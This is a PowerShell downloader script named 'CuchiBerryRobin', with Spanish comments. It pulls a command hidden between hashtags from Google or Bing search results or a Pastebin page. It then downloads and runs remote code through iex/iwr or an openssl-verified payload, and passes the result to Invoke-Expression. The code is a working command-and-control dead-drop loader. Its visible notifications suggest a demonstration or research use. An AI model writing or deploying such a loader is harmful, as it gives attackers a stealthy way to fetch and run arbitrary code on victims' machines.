#Downloader CUCHIBERRYROBIN
$Conf_Hashtag_init="#CUCHIBERRYROBIN"
$Conf_Hashtag_end="#FIN"

#Not working, need workaround to get from google 
$content = Invoke-WebRequest -Uri "https://www.google.com/search?q=$Conf_Hashtag_init" -UseBasicParsing
$patron = '(?<=$Conf_Hashtag_init )(.*)(?= $Conf_Hashtag_end)'
$resultado = [regex]::Match($content.Content, $patron).Value
$from="Google"
#Bun BING WORKS!!!
#Pero OPCION #TODO CIPHER XOR
if (([string]::IsNullOrEmpty($resultado)))
{
$conf_hashtag_init_encoded = [System.Uri]::EscapeDataString($Conf_Hashtag_init)
$content = Invoke-WebRequest -Uri "https://www.bing.com/search?q=$conf_hashtag_init_encoded" -UseBasicParsing
$patron = "(?<=$Conf_Hashtag_init\s)(.*?)(?=\s*$Conf_Hashtag_end)"
$resultado = ($content | Select-String -Pattern $patron -AllMatches).Matches[0].Value
$from="Bing"

}



#TerceraA OPCION #TODO CIPHER XOR
if (([string]::IsNullOrEmpty($resultado)))
{
$content = Invoke-WebRequest -Uri "https://pastebin.com/ABiV0rH7" -UseBasicParsing
$patron = "(?<=$Conf_Hashtag_init\s)(.*?)(?=\s*$Conf_Hashtag_end)"
$resultado = [regex]::Match($content, $patron).Value
$from="Pastebin"
}

$resultado=[System.Net.WebUtility]::HtmlDecode($resultado)



$Title = "CuchiBerryRObin"
$Message = "Descargando comando $resultado de $from"
$Type = "info" 
  
[reflection.assembly]::loadwithpartialname("System.Windows.Forms") | out-null
$path = Get-Process -id $pid | Select-Object -ExpandProperty Path
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
$notify = new-object system.windows.forms.notifyicon
$notify.icon = $icon
$notify.visible = $true
$notify.showballoontip(10,$Title,$Message, [system.windows.forms.tooltipicon]::$Type)

#$resultado = " $ https://rentry.co/6vkoq/raw"
#$resultado = " ñC https://pastebin.com/raw/R6sTE0GK"
#COMANDOS 
# $ httpimplica descargar y ejecutar script ejemplo $ https://pastebin.com/raw/ABiV0rH7
# ñC implica firmado con openssl en URL ñC https://pastebin.com/raw/R6sTE0GK


$patron = '\$\shttp[^\s]+'

if ($resultado -match $patron) {
      $url = $matches[0] -replace '\$+',''
    $resultado = "iex (iwr '$url' -UseBasicParsing).Content"
}

# Buscar la posición de "ñC detro de resultado, pero como no cabe, debe ir unido al $ una vez descargado"
$posicion = $resultado.IndexOf('ñC')

if ($posicion -ne -1) {
    # Extraer el contenido posterior a "ñC"
    $resultado = $resultado.Substring($posicion + 3) 
    $resultado = (iwr $resultado -UseBasicParsing).Content
    
    $archivoTemporal = [System.IO.Path]::GetTempFileName()
    [IO.File]::WriteAllBytes($archivoTemporal, [Convert]::FromBase64String($resultado))
    
    $resultado = openssl pkeyutl -verifyrecover -in $archivoTemporal  -inkey private.der

    

$Title = "CuchiBerryRObin"
$Message = "Descifrando comando Robin Cifrado"
$Type = "info" 
  
[reflection.assembly]::loadwithpartialname("System.Windows.Forms") | out-null
$path = Get-Process -id $pid | Select-Object -ExpandProperty Path
$icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
$notify = new-object system.windows.forms.notifyicon
$notify.icon = $icon
$notify.visible = $true
$notify.showballoontip(10,$Title,$Message, [system.windows.forms.tooltipicon]::$Type)
} 

Write-Output "COMANDO:"$resultado


Invoke-Expression $resultado



